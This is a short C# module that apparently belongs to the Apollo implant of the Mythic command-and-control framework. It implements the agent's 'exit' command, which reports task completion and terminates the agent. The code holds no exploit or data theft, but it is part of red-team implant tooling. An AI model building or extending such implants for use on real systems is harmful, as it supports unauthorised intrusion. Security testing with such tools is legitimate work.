#define COMMAND_NAME_UPPER

#if DEBUG
#define EXIT
#endif

#if EXIT
using ApolloInterop.Classes;
using ApolloInterop.Interfaces;
using ApolloInterop.Structs.MythicStructs;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Tasks
{
    public class exit : Tasking
    {
        public exit(IAgent agent, Task data) : base(agent, data)
        {
        }


        public override void Start()
        {
            _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse("", true));
            _agent.Exit();
        }
    }
}
#endif